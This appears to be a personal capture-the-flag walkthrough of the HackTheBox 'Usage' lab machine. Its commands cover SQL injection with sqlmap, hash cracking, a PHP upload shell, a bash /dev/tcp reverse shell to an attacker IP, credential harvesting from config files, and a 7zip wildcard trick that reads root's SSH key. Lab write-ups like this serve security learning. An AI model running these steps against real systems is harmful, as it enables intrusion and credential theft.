2024 

### NMAP

```
sudo nmap -sC -sV -vv -oA nmap-usage 
10.10.11.18
```

![[HackTheBox/Linux/attachments/Pasted image 20250512000559.png]]
- 22, 80
- add `usage.htb` to `/etc/hosts`

### Enumerate website 

See login form 

![[HackTheBox/Linux/attachments/Pasted image 20250512000735.png]]
- default creds don't work

Intercept request with Burp
![[HackTheBox/Linux/attachments/Pasted image 20250512000846.png]]
- Notice this is a Laravel app

Trying out registration  form now 

![[HackTheBox/Linux/attachments/Pasted image 20250512000943.png]]

Now login with newly created account 
![[HackTheBox/Linux/attachments/Pasted image 20250512001016.png]]

Successfully logged in 
![[HackTheBox/Linux/attachments/Pasted image 20250512001056.png]]

Trying to reset password
![[HackTheBox/Linux/attachments/Pasted image 20250512001412.png]]

-----------------
Enum in the background
#### gobuster 

```
gobuster dir -u http://usage.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o root.out 
```

---------

#### SQLi the Reset Password Box

Adding `'-- -`

![[HackTheBox/Linux/attachments/Pasted image 20250512001833.png]]

Intercept this request with Burperoni 

![[HackTheBox/Linux/attachments/Pasted image 20250512001937.png]]

Send request and the response gives us nothing... then assume it's boolean based SQLi?

![[HackTheBox/Linux/attachments/Pasted image 20250512002056.png]]

Copy the request to a file called reset.req. 

#### SQLMAP

Use sqlmap to fuzz the email parameter with boolean technique

```
sqlmap -r request.req -p email --level 5 --risk 3 --technique=B --batch
```

Found a SQLi vulnerability 
![[HackTheBox/Linux/attachments/Pasted image 20250512002601.png]]

Dump the databases with --dbs
```
sqlmap -r request.req -p email --level 5 --risk 3 --technique=B --batch --dbs --threads 10
```

![[HackTheBox/Linux/attachments/Pasted image 20250512003005.png]]

Dump the database usage_blog 

```
sqlmap -r request.req -p email --level 5 --risk 3 --technique=B --threads 10 --batch --dump usage_blog
```

Users table with hashiess
![[HackTheBox/Linux/attachments/Pasted image 20250512003300.png]]

Save these hashes to a file and crack dem hashes

### hashcat

Crack the hashes (bcrypt -> mode 3200)
```
hashcat -m 3200 usage.bcrypt /usr/share/wordlists/rockyou.txt
```

Passwords cracked
![[HackTheBox/Linux/attachments/Pasted image 20250512003650.png]]
- got raj's password as `xander`

### Login to website with found creds

`raj@raj.com:xander`

![[HackTheBox/Linux/attachments/Pasted image 20250512003806.png]]
- this does work but we're not an admin

Getting the admin_users table instead using sqlmap 

![[HackTheBox/Linux/attachments/Pasted image 20250512004150.png]]
- got admin hash 

Crack this hash using hashcat and get the password `whatever1` for the admin user 

![[HackTheBox/Linux/attachments/Pasted image 20250512004312.png]]

### Login to website as admin 

Use found creds to login to admin.usage.htb

![[HackTheBox/Linux/attachments/Pasted image 20250512004425.png]]
We're logged in!
![[HackTheBox/Linux/attachments/Pasted image 20250512004448.png]]
- encore/laravel-admin 1.8.18 -> search for exploits here

Googling for exploits on this laravel version and find there's likely a arbitrary code execution vuln
![[HackTheBox/Linux/attachments/Pasted image 20250512004649.png]]
- it's a php file upload vulnerability 

Intercept the web form of the admin user 

![[HackTheBox/Linux/attachments/Pasted image 20250512195344.png]]
- change filename to `shell.php`
- add php script to request body

![[HackTheBox/Linux/attachments/Pasted image 20250512195447.png]]
- this should change the avatar to the shell script

Navigate to the admin user profile again 

![[HackTheBox/Linux/attachments/Pasted image 20250512195549.png]]

Then execute the `id` command and confirm code execution 

![[HackTheBox/Linux/attachments/Pasted image 20250512195637.png]]

#### Get a reverse shell 
Returning the Burp request and changing to a POST request

![[HackTheBox/Linux/attachments/Pasted image 20250512195752.png]]
- Change request method to POST

The add the reverse shell script to the body of the request 

```
bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
```

Then url-encode it

![[HackTheBox/Linux/attachments/Pasted image 20250512200010.png]]

Set up nc listener
```
nc -lvnp 9001
```

Catch the reverse shell
![[HackTheBox/Linux/attachments/Pasted image 20250512200226.png]]

❗got initial access❗ as dash user

Get interactive shell.

### Enumerating for priv esc 

Look for the SQL passwords 

```
cat /var/www/html/project_admin/config/database.php
```
- only found defaults
- tried to login to mysql with defaults but it didn't work

Checking the .env file 
```
cat .env
```

![[HackTheBox/Linux/attachments/Pasted image 20250512200731.png]]
- got the mysql password

#### Connect to MySQL with found creds

```
mysql -u staff -p 
```

After logging in...

```
show databases;
```

![[HackTheBox/Linux/attachments/Pasted image 20250512200856.png]]
- nothing useful :(

#### Enumerate our user's privs, files, accesses
Navigate to dash's home directory.

Checking out this `.monitrc`

![[HackTheBox/Linux/attachments/Pasted image 20250512201021.png]]

There's another credential in this file 
![[HackTheBox/Linux/attachments/Pasted image 20250512201046.png]]

Trying 
```
sudo -l
```

And inputting the found passwords

![[HackTheBox/Linux/attachments/Pasted image 20250512205248.png]]
- neither of them work 

Check to see what users are on the box 

```
cat /etc/passwd | grep sh$
```

![[HackTheBox/Linux/attachments/Pasted image 20250512205401.png]]
- root, dash, xander

Attempt to switch to xander and try the found passwords again
```
su - xander
```

![[HackTheBox/Linux/attachments/Pasted image 20250512205508.png]]
- xander's password was `3nc0d3d_pa$$w0rd`

### Sudo -l

Run `sudo -l` as xander 

![[HackTheBox/Linux/attachments/Pasted image 20250512205630.png]]
- we can execute `/usr/bin/usage_management` as root 

Execute this binary and review options 
![[HackTheBox/Linux/attachments/Pasted image 20250512205735.png]]

Select option 3 to reset admin password

![[HackTheBox/Linux/attachments/Pasted image 20250512205814.png]]
- just says password has been reset..

Trying option 1 for project backup

![[HackTheBox/Linux/attachments/Pasted image 20250512205912.png]]
- it's compresssing files into a .zip

Let's run #strings against this binary to get some more info 

```
strings /usr/bin/usage_management
```

Notice this 7zip command is vulnerable to [Wildcard Spare Trick ](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/wildcards-spare-tricks)

![[HackTheBox/Linux/attachments/Pasted image 20250512210315.png]]

Basically this vulnerability gives us the ability to read files we don't have permissions to read.

### Wildcard Spare Trick to Read Root's id_rsa

Create `@root.txt`
```
touch -- @root.txt
```
Create `@id_rsa`
```
touch -- @id_rsa
```
Create symlink for `root.txt`
```
ln -s /root/root.txt root.txt
```
Create symlink for `id_rsa`
```
ln -s /root/.ssh/id_rsa id_rsa
```

Move these files into` /var/www/html`
```
mv * /var/www/html
```

Switch to this directory 

![[HackTheBox/Linux/attachments/Pasted image 20250512211123.png]]

Now when 7zip runs, it will hit the wildcard, which will see @root.txt and @id_rsa and read the file.

Execute the binary
```
sudo /usr/bin/usage_management
```

It's printing the ssh keyyyy
![[HackTheBox/Linux/attachments/Pasted image 20250512211328.png]]

Got root's ssh key 
![[HackTheBox/Linux/attachments/Pasted image 20250512211355.png]]

Save this to a file called root and chmod the file 

```
chmod 600 root
```

### SSH in as root
```
ssh -i root root@10.10.11.18
```

![[HackTheBox/Linux/attachments/Pasted image 20250512211525.png]]
⭐got root⭐